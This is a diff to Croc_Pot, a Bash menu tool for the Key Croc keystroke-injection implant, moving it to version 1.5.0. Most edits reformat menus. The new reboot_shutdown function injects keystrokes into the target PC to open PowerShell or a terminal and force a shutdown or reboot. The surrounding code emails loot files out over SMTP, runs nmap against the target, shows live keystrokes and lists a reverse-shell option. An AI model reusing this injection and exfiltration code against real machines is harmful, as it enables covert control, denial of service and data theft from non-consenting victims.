@@ -4,7 +4,7 @@
 # Title:         Croc_Pot
 # Description:   Email KeyCroc INFO & Log files & Nmap scan Plus save to loot folder and more
 # Author:        Spywill
-# Version:       1.4.9
+# Version:       1.5.0
 # Category:      Key Croc
 ##
 ##
@@ -55,10 +55,10 @@ MenuTitle() {
 	echo -ne "\n\t\t\t\e[41;4;1m${*}${clear}\n"
 }
 MenuColor() {
-	echo -ne "\t\t\t\e[40;1m${1}${clear}${green})${clear}\e[40;38;5;202;4m${2} ${3} ${4} ${5} ${6} ${7}"
+	echo -ne "\t\t\t\e[40;1m${1}${clear}\e[40m${green}->${clear}\e[40;38;5;202;4m${2} ${3} ${4} ${5} ${6} ${7}"
 }
 MenuEnd() {
-	echo -ne "\t\t\t\e[40;1m0${clear}${green})${clear}\e[40;4;32mEXIT               \U27B2 ${clear} 
+	echo -ne "\t\t\t\e[40;1m0${clear}\e[40m${green}->${clear}\e[40;4;32mEXIT               \U27B2 ${clear} 
 \t\t\e[40m$(ColorBlue 'CHOOSE AN OPTION AND PRESS [ENTER]:') ${clear}"
 }
 Info_Screen() {
@@ -93,7 +93,7 @@ fi
 \e[40;31m${LINE_A}${clear}\e[40m»${clear}\e[40;31mKEYCROC${clear}\e[40m-${clear}\e[40;31mHAK${clear}\e[40m❺ ${clear}\e[40m«${clear}\e[40;31m---------${clear}\e[41;38;5;232m♁${clear}\e[40m${yellow} $(hostname) IP: $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) $(internet_test)         ${clear}
 \e[40;31m   DEVELOPED BY ${clear}\e[40mSPYWILL ${clear}\e[40m               ${clear}\e[41;38;5;232m§${clear}\e[40m${yellow} $(hostname) VER: $(cat /root/udisk/version.txt) *TARGET-PC:${green}$(OS_CHECK)   $(FILL_IN)${clear}
 \e[40;31m   DATE OF SCAN${clear}\e[40m ${DATE}${clear}\e[41;38;5;232mΩ${clear}\e[40m${yellow} $(hostname) keyboard: $(sed -n 9p /root/udisk/config.txt)           ${clear}
-\e[40;31m${LINE_A}${clear}\e[40;92m»CROC_POT«\e[40;31m--${clear}\e[40m${yellow}VER:1.4.9\e[40;31m---${clear}\e[41;38;5;232mᛝ${clear}\e[40m${yellow} CPU TEMP:$(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE:$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}') MEM:$(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }')   ${clear}
+\e[40;31m${LINE_A}${clear}\e[40;92m»CROC_POT«\e[40;31m--${clear}\e[40m${yellow}VER:1.5.0\e[40;31m---${clear}\e[41;38;5;232mᛝ${clear}\e[40m${yellow} CPU TEMP:$(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE:$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}') MEM:$(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }')   ${clear}
 \e[41;38;5;232m${LINE}${clear}\n\n"	
 }
 function croc_title_loot() {
@@ -139,7 +139,7 @@ function nmap_menu() {
 	local LOOT_NMAP=/root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt
 	echo -ne "$(Info_Screen '
 -Start some basic nmap scan and save to loot folder\n
--Enter IP for scan or default will be target pc ip ' $(os_ip))${clear}\n"
+-Enter IP for scan or default will be target pc ip\n'$(os_ip))${clear}\n\n"
 ##
 #----Nmap User IP Input Function
 ##
@@ -269,22 +269,15 @@ function croc_logs_mean() {
 	local LOOT_LOG=/root/udisk/loot/Croc_Pot/KeyCroc_LOG.txt
 	LED B
 	croc_title
-MenuTitle KEYCROC LOG MENU
-MenuColor 1 MESSAGES LOG ; echo -ne "       ${clear}\n"
-MenuColor 2 KERNEL LOG ; echo -ne "         ${clear}\n"
-MenuColor 3 SYSTEM LOG ; echo -ne "         ${clear}\n"
-MenuColor 4 SYSSTAT LOG ; echo -ne "        ${clear}\n"
-MenuColor 5 DEBUG LOG ; echo -ne "          ${clear}\n"
-MenuColor 6 DPKG LOG ; echo -ne "           ${clear}\n"
-MenuColor 7 NTPSTATS LOG ; echo -ne "       ${clear}\n"
-MenuColor 8 AUTH LOG ; echo -ne "           ${clear}\n"
-MenuColor 9 DMESG LOG ; echo -ne "          ${clear}\n"
-MenuColor 10 BOOTSTRAP LOG ; echo -ne "     ${clear}\n"
-MenuColor 11 ALTERNATIVES LOG ; echo -ne "  ${clear}\n"
-MenuColor 12 MAIL INFO LOG ; echo -ne "      ${clear}\n"
-MenuColor 13 DAEMON LOG ; echo -ne "        ${clear}\n"
-MenuColor 14 KEYSTROKES LOG ; echo -ne "    ${clear}\n"
-MenuColor 15 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
+echo -ne "\n" ; MenuTitle KEYCROC LOG MENU | tr '\n' '\t' ; echo -ne "\n"
+echo -ne "\t\t" ; MenuColor 1 MESSAGES LOG | tr -d '\t' ; echo -ne "${clear}" ; MenuColor 8 AUTH LOG | tr -d '\t' ; echo -ne "         ${clear}\n"
+echo -ne "\t\t" ; MenuColor 2 KERNEL LOG | tr -d '\t' ; echo -ne "  ${clear}" ; MenuColor 9 DMESG LOG | tr -d '\t' ; echo -ne "        ${clear}\n"
+echo -ne "\t\t" ; MenuColor 3 SYSTEM LOG | tr -d '\t' ; echo -ne "  ${clear}" ; MenuColor 10 BOOTSTRAP LOG | tr -d '\t' ; echo -ne "   ${clear}\n"
+echo -ne "\t\t" ; MenuColor 4 SYSSTAT LOG | tr -d '\t' ; echo -ne " ${clear}" ; MenuColor 11 ALTERNATIVES LOG | tr -d '\t' ; echo -ne "${clear}\n"
+echo -ne "\t\t" ; MenuColor 5 DEBUG LOG | tr -d '\t' ; echo -ne "   ${clear}" ; MenuColor 12 MAIL INFO LOG | tr -d '\t' ; echo -ne "    ${clear}\n"
+echo -ne "\t\t" ; MenuColor 6 DPKG LOG | tr -d '\t' ; echo -ne "    ${clear}" ; MenuColor 13 DAEMON LOG | tr -d '\t' ; echo -ne "      ${clear}\n"
+echo -ne "\t\t" ; MenuColor 7 NTPSTATS LOG | tr -d '\t' ; echo -ne "${clear}" ; MenuColor 14 KEYSTROKES LOG | tr -d '\t' ; echo -ne "  ${clear}\n"
+MenuColor 15 RETURN TO MAIN MENU ; echo -ne "${clear}\n"
 MenuEnd
 	unset m_a
 	read m_a
@@ -507,21 +500,17 @@ MenuEnd
 #----Python E-mail Function
 ##
 python_email() {
-local USER_EMAL=$(sed -n 2p ${USER_CR})
-local USER_PASSWD=$(sed -n 3p ${USER_CR})
-local USER_SEND=$(sed -n 4p ${USER_CR})
-local USER_SMTP=$(sed -n 1p ${USER_CR})
-rm ${PYTHON_MAIL}
-sleep 1
-echo -ne "import smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n
-from email.mime.base import MIMEBase\nfrom email import encoders\nimport os.path\n\nemail = '${USER_EMAL}'\npassword = '${USER_PASSWD}'\nsend_to_email = '${USER_SEND}'\n
+	rm ${PYTHON_MAIL}
+	sleep 1
+	echo -ne "import smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n
+from email.mime.base import MIMEBase\nfrom email import encoders\nimport os.path\n\nemail = '$(sed -n 2p ${USER_CR})'\npassword = '$(sed -n 3p ${USER_CR})'\nsend_to_email = '$(sed -n 4p ${USER_CR})'\n
 subject = 'CROC_MAIL'\nmessage = '${r_a}${MY_MESS_A}'\n${FILE_A_B} ${FILE_I_B}\n
 msg = MIMEMultipart()\nmsg['From'] = email\nmsg['To'] = send_to_email\nmsg['Subject'] = subject\nmsg.attach(MIMEText(message, 'plain'))\n
 ${FILE_B_B}\n${FILE_C_B}\n${FILE_D_B}\n${FILE_E_B}\n${FILE_F_B}\n${FILE_G_B}\n
-${FILE_H_B}\nserver = smtplib.SMTP('${USER_SMTP}', 587)\nserver.starttls()\nserver.login(email, password)\n
+${FILE_H_B}\nserver = smtplib.SMTP('$(sed -n 1p ${USER_CR})', 587)\nserver.starttls()\nserver.login(email, password)\n
 text = msg.as_string()\nserver.sendmail(email, send_to_email, text)\nserver.quit()" >> ${PYTHON_MAIL}
-sleep 1
-python ${PYTHON_MAIL}
+	sleep 1
+	python ${PYTHON_MAIL}
 }
 ##
 #----Croc Mail check for existing email
@@ -997,15 +986,22 @@ croc_vpn() {
 -From your VPN server of choice\n
 -Place it on the keycroc root of the udisk\n
 -Then select #1 VPN SETUP to do the rest\n
--Check to see if openvpn is installed if not installing it\n')${clear}\n"
+-Check to see if openvpn is installed\n')${clear}\n"
 setup_vpn() {
 ##
 #----VPN Check/install openvpn
 ##
-	local pkg_vpn=openvpn
-	local status_vpn="$(dpkg-query -W --showformat='${db:Status-Status}' "$pkg_vpn" 2>&1)"
+	local status_vpn="$(dpkg-query -W --showformat='${db:Status-Status}' "openvpn" 2>&1)"
 if [ ! $? = 0 ] || [ ! "$status_vpn" = installed ]; then
-	apt install $pkg_vpn
+	read_all INSTALL OPENVPN Y/N AND PRESS [ENTER]
+	case $r_a in
+	[yY] | [yY][eE][sS])
+		apt install openvpn ;;
+	[nN] | [nN][oO])
+		echo -ne "\n\e[40m$(ColorYellow 'Maybe next time')\n${clear}" ;;
+	*)
+		invalid_entry ; croc_vpn ;;
+	esac
 fi
 ##
 #----VPN user input
@@ -1054,7 +1050,7 @@ MenuEnd
 pass_time() {
 	clear
 	echo -ne "$(Info_Screen '
--I am not the developer of these script\n
+-I am not the developer of these scripts\n
 -Thought I would share them\n
 -Show the power of the keycroc and bash scripting\n')${clear}\n"
 ##
@@ -3753,7 +3749,7 @@ else
 		Q ALT-TAB
 		Q ALT-TAB
 		sleep 10
-		ATTACKMODE HID;;
+		ATTACKMODE HID ;;
 	parrot)
 		Q ALT F2
 		sleep 1
@@ -3770,7 +3766,7 @@ else
 		Q ENTER
 		Q ALT-TAB
 		sleep 10
-		ATTACKMODE HID;;
+		ATTACKMODE HID ;;
 		*)
 		Q ALT F2
 		sleep 1
@@ -3791,7 +3787,7 @@ else
 	esac
 fi ;;
 	[nN] | [nN][oO])
-		echo -ne "$(ColorYellow 'BACK TO CROC POT PLUS MENU')"
+		echo -ne "\n\e[40m$(ColorYellow 'Maybe next time')\n${clear}"
 		menu_B ;;
 	*)
 		invalid_entry ; screen_shot ;;
@@ -3875,6 +3871,8 @@ kernel_check() {
 processes_check() {
 	echo -ne "\n\e[40m$(ColorYellow 'Running Processes') ${server_name} is:${clear}\n"
 	ps -aux
+	service --status-all
+	findmnt -A
 }
 ##
 #----Status KeyCroc info
@@ -3933,8 +3931,7 @@ keystorkes_V() {
 #----Status nmon monitoring system
 ##
 nmon_system() {
-	local pkg=nmon
-	local status="$(dpkg-query -W --showformat='${db:Status-Status}' "$pkg" 2>&1)"
+	local status="$(dpkg-query -W --showformat='${db:Status-Status}' "nmon" 2>&1)"
 if [ ! $? = 0 ] || [ ! "$status" = installed ]; then
 	read_all INSTALL NMON MONITORING Y/N AND PRESS [ENTER]
 	case $r_a in
@@ -3994,7 +3991,7 @@ MenuColor 6 CHECK ALL ; echo -ne "                ${clear}\n"
 MenuColor 7 TARGET PC INFO ; echo -ne "            ${clear}\n"
 MenuColor 8 VIEW LIVE KEYSTORKES ; echo -ne "      ${clear}\n"
 MenuColor 9 START NMON MONITORING ; echo -ne "     ${clear}\n"
-MenuColor 10 LIST MATCH WORDS PAYLOADS ; echo -ne " ${clear}\n"
+MenuColor 10 LIST MATCH PAYLOADS WORDS ; echo -ne " ${clear}\n"
 MenuColor 11 RETURN TO MAIN MENU ; echo -ne "       ${clear}\n"
 MenuEnd
 	unset m_a
@@ -4073,9 +4070,8 @@ fi
 #----Edit Config files Function
 ##
 edit_config() {
-	local USER_CONFIG_V=/root/udisk/config.txt
-if [ -e "${USER_CONFIG_V}" ]; then
-	nano ${USER_CONFIG_V}
+if [ -e "/root/udisk/config.txt" ]; then
+	nano /root/udisk/config.txt
 else
 	invalid_entry
 fi
@@ -4125,8 +4121,7 @@ midnight_manager() {
 #----midnight install function
 ##
 mc_install() {
-	local pkg=mc
-	local status="$(dpkg-query -W --showformat='${db:Status-Status}' "$pkg" 2>&1)"
+	local status="$(dpkg-query -W --showformat='${db:Status-Status}' "mc" 2>&1)"
 if [ ! $? = 0 ] || [ ! "$status" = installed ]; then
 	read_all INSTALL MIDNIGHT COMMANDER Y/N AND PRESS [ENTER]
 	case $r_a in
@@ -4941,23 +4936,16 @@ remove_sshkey() {
 }
 ##
 #----SSH Menu
-##
+## 
 	LED B
-MenuTitle CROC SSH MENU
-MenuColor 1 START SSH WITH TARGET PC ; echo -ne "    ${clear}\n"
-MenuColor 2 START SSH WITH USER INPUT ; echo -ne "   ${clear}\n"
-MenuColor 3 ENABLE_SSH ; echo -ne "              ${clear}\n"
-MenuColor 4 DISABLE_SSH ; echo -ne "             ${clear}\n"
-MenuColor 5 WIFI PINEAPPLE ; echo -ne "           ${clear}\n"
-MenuColor 6 PACKET SQUIRREL ; echo -ne "          ${clear}\n"
-MenuColor 7 LAN TURTLE ; echo -ne "               ${clear}\n"
-MenuColor 8 SIGNAL OWL ; echo -ne "               ${clear}\n"
-MenuColor 9 SHARK JACK ; echo -ne "               ${clear}\n"
-MenuColor 10 BASH BUNNY ; echo -ne "              ${clear}\n"
-MenuColor 11 REVERSE SHELL ; echo -ne "           ${clear}\n"
-MenuColor 12 CREATE PUBLIC/PRIVATE KEY ; echo -ne "${clear}\n"
-MenuColor 13 REMOVE SSH_KEYGEN ; echo -ne "       ${clear}\n"
-MenuColor 14 RETURN TO MAIN MENU ; echo -ne "       ${clear}\n"
+echo -ne "\n" ; MenuTitle CROC POT SSH MENU | tr '\n' '\t' ; echo -ne "\n"
+echo -ne "\t\t" ; MenuColor 1 SSH TARGET PC | tr -d '\t' ; echo -ne "   ${clear}" ; MenuColor 8 SIGNAL OWL | tr -d '\t' ; echo -ne "         ${clear}\n"
+echo -ne "\t\t" ; MenuColor 2 SSH USER INPUT | tr -d '\t' ; echo -ne "  ${clear}" ; MenuColor 9 SHARK JACK | tr -d '\t' ; echo -ne "         ${clear}\n"
+echo -ne "\t\t" ; MenuColor 3 ENABLE_SSH | tr -d '\t' ; echo -ne "    ${clear}" ; MenuColor 10 BASH BUNNY | tr -d '\t' ; echo -ne "        ${clear}\n"
+echo -ne "\t\t" ; MenuColor 4 DISABLE_SSH | tr -d '\t' ; echo -ne "   ${clear}" ; MenuColor 11 REVERSE SHELL | tr -d '\t' ; echo -ne "     ${clear}\n"
+echo -ne "\t\t" ; MenuColor 5 WIFI PINEAPPLE | tr -d '\t' ; echo -ne " ${clear}" ; MenuColor 12 PUBLIC/PRIVATE KEY | tr -d '\t' ; echo -ne "${clear}\n"
+echo -ne "\t\t" ; MenuColor 6 PACKET SQUIRREL | tr -d '\t' ; echo -ne "${clear}" ; MenuColor 13 REMOVE SSH_KEYGEN | tr -d '\t' ; echo -ne " ${clear}\n"
+echo -ne "\t\t" ;MenuColor 7 LAN TURTLE | tr -d '\t' ; echo -ne "     ${clear}" ; MenuColor 14 RETURN TO MAIN MENU | tr -d '\t' ; echo -ne " ${clear}\n"
 MenuEnd
 	unset m_a
 	read m_a
@@ -5175,6 +5163,114 @@ Update/Upgrade your KeyCroc Packages\n')${clear}\n\n"
 	esac
 }
 ##
+#----Recovery Reboot/Shutdown target pc
+##
+reboot_shutdown() {
+	clear
+	echo -ne "$(Info_Screen '
+-Reboot or shutdown Target pc\n
+-\n')${clear}\n\n"
+shutdown_pc() {
+if [ "$(OS_CHECK)" = WINDOWS ]; then
+	Q GUI d
+	Q GUI r
+	sleep 1
+	Q STRING "powershell"
+	Q ENTER
+	sleep 2
+	Q STRING "Stop-Computer -ComputerName localhost"
+	Q ENTER
+else
+	local HOST_CHECK=$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)
+	case $HOST_CHECK in
+	raspberrypi)
+		Q GUI d
+		sleep 1
+		Q STRING "terminal"
+		Q ENTER
+		Q ENTER
+		sleep 1
+		Q STRING "shutdown -h 0" 
+		Q ENTER ;;
+	parrot)
+		Q ALT F2
+		sleep 1
+		Q STRING "mate-terminal"
+		Q ENTER
+		sleep 1
+		Q STRING "shutdown -h 0"
+		Q ENTER ;;
+	*)
+		Q ALT F2
+		sleep 1
+		Q STRING "xterm"
+		Q ENTER
+		sleep 1
+		Q STRING "shutdown -h 0"
+		Q ENTER ;;
+	esac
+fi
+}
+reboot_pc() {
+if [ "$(OS_CHECK)" = WINDOWS ]; then
+	Q GUI d
+	Q GUI r
+	sleep 1
+	Q STRING "powershell"
+	Q ENTER
+	sleep 2
+	Q STRING "Restart-Computer"
+	Q ENTER
+else
+	local HOST_CHECK=$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)
+	case $HOST_CHECK in
+	raspberrypi)
+		Q GUI d
+		sleep 1
+		Q STRING "terminal"
+		Q ENTER
+		Q ENTER
+		sleep 1
+		Q STRING "shutdown -r 0" 
+		Q ENTER ;;
+	parrot)
+		Q ALT F2
+		sleep 1
+		Q STRING "mate-terminal"
+		Q ENTER
+		sleep 1
+		Q STRING "shutdown -r 0"
+		Q ENTER ;;
+	*)
+		Q ALT F2
+		sleep 1
+		Q STRING "xterm"
+		Q ENTER
+		sleep 1
+		Q STRING "shutdown -r 0"
+		Q ENTER ;;
+	esac
+fi
+}
+##
+#----Recovery Reboot/Shutdown menu
+##
+MenuTitle REBOOT/SHUTDOWN TARGET PC
+MenuColor 1 SHUTDOWN TARGET PC ; echo -ne "${clear}\n"
+MenuColor 2 REBOOT TARGET PC ; echo -ne "  ${clear}\n"
+MenuColor 3 RETURN TO MAIN MENU ; echo -ne "${clear}\n"
+MenuEnd
+	unset m_a
+	read m_a
+	case $m_a in
+	1) shutdown_pc ;;
+	2) reboot_pc ;;
+	3) main_menu ;;
+	0) exit 0 ;;
+	*) invalid_entry ; reboot_shutdown ;;
+	esac
+}
+##
 #----Recovery menu
 ##
 MenuTitle KEYCROC RECOVERY MENU
@@ -5185,7 +5281,8 @@ MenuColor 4 REMOVE LASTEST FIRMWARE ; echo -ne "   ${clear}\n"
 MenuColor 5 REPAIR en_US.UTF-8 ERROR ; echo -ne "  ${clear}\n"
 MenuColor 6 KEYCROC UPDATE PACKAGES; echo -ne "   ${clear}\n"
 MenuColor 7 REMOVE CROC_POT AN CONTENTS ; echo -ne "${clear}\n"
-MenuColor 8 RETURN TO MAIN MENU ; echo -ne "        ${clear}\n"
+MenuColor 8 REBOOT/SHUTDOWN TARGET PC ; echo -ne " ${clear}\n"
+MenuColor 9 RETURN TO MAIN MENU ; echo -ne "        ${clear}\n"
 MenuEnd
 	unset m_a
 	read m_a
@@ -5197,7 +5294,8 @@ MenuEnd
 	5) locale_en_US ; croc_recovery ;;
 	6) croc_update ;;
 	7) remove_croc_pot ;;
-	8) main_menu ;;
+	8) reboot_shutdown ;;
+	9) main_menu ;;
 	0) exit 0 ;;
 	*) invalid_entry ; croc_recovery ;;
 	esac
@@ -5224,10 +5322,9 @@ cloud_setup() {
 	read_all DOWNLOAD AND INSTALL CLOUD C2 AND UNZIP Y/N AND PRESS [ENTER]
 	case $r_a in
 	[yY] | [yY][eE][sS])
-	local pkg_zip=unzip
-	local status_zip="$(dpkg-query -W --showformat='${db:Status-Status}' "$pkg_zip" 2>&1)"
+	local status_zip="$(dpkg-query -W --showformat='${db:Status-Status}' "unzip" 2>&1)"
 if [ ! $? = 0 ] || [ ! "$status_zip" = installed ]; then
-	apt install $pkg_zip
+	apt install unzip
 fi
 ##
 #----Hak5 Cloud_C2 download and install
@@ -5292,7 +5389,7 @@ else
 	sleep 5
 	Q ALT-TAB
 	sleep 1
-	Q ALT-F4;;
+	Q ALT-F4 ;;
 	parrot)
 	Q ALT F2
 	sleep 1
@@ -5304,7 +5401,7 @@ else
 	sleep 5
 	Q ALT-TAB
 	sleep 1
-	Q ALT-F4;;
+	Q ALT-F4 ;;
 	*)
 	Q ALT F2
 	sleep 1
@@ -5316,7 +5413,7 @@ else
 	sleep 5
 	Q ALT-TAB
 	sleep 1
-	Q ALT-F4;;
+	Q ALT-F4 ;;
 	esac
 fi
 }
